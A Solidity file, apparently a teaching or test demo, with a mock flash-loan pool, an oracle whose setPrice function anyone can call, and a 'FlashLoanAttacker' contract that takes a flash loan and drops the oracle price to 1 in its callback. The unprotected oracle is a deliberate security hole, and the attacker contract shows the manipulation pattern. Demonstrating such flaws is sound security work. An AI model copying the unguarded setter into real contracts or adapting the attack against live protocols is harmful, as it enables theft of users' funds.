pragma solidity ^0.8.34;

interface IFlashToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFlashBorrower {
    function executeOperation(uint256 amount, uint256 premium) external returns (bool);
}

contract VulnerableOracle {
    uint256 public price = 100;

    function setPrice(uint256 newPrice) external {
        price = newPrice;
    }
}

contract MockFlashLoanPool {
    IFlashToken public immutable token;
    uint256 public constant premiumBps = 9;

    event FlashLoanCompleted(address indexed borrower, uint256 amount, uint256 premium);

    constructor(address tokenAddress) {
        token = IFlashToken(tokenAddress);
    }

    function flashLoan(address receiver, uint256 amount) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        uint256 premium = amount * premiumBps / 10000;
        require(token.transfer(receiver, amount), "Transfer failed");
        require(IFlashBorrower(receiver).executeOperation(amount, premium), "Callback failed");
        require(token.transferFrom(receiver, address(this), amount + premium), "Repayment failed");
        require(token.balanceOf(address(this)) >= balanceBefore + premium, "Loan not repaid");
        emit FlashLoanCompleted(receiver, amount, premium);
    }
}

contract FlashLoanAttacker is IFlashBorrower {
    address public immutable owner;
    MockFlashLoanPool public immutable pool;
    IFlashToken public immutable token;
    VulnerableOracle public immutable oracle;

    event OracleManipulated(uint256 borrowedAmount, uint256 manipulatedPrice);

    constructor(address poolAddress, address tokenAddress, address oracleAddress) {
        owner = msg.sender;
        pool = MockFlashLoanPool(poolAddress);
        token = IFlashToken(tokenAddress);
        oracle = VulnerableOracle(oracleAddress);
    }

    function initiateAttack(uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        pool.flashLoan(address(this), amount);
    }

    function executeOperation(uint256 amount, uint256 premium) external returns (bool) {
        require(msg.sender == address(pool), "Only pool");
        oracle.setPrice(1);
        token.approve(address(pool), amount + premium);
        emit OracleManipulated(amount, oracle.price());
        return true;
    }
}
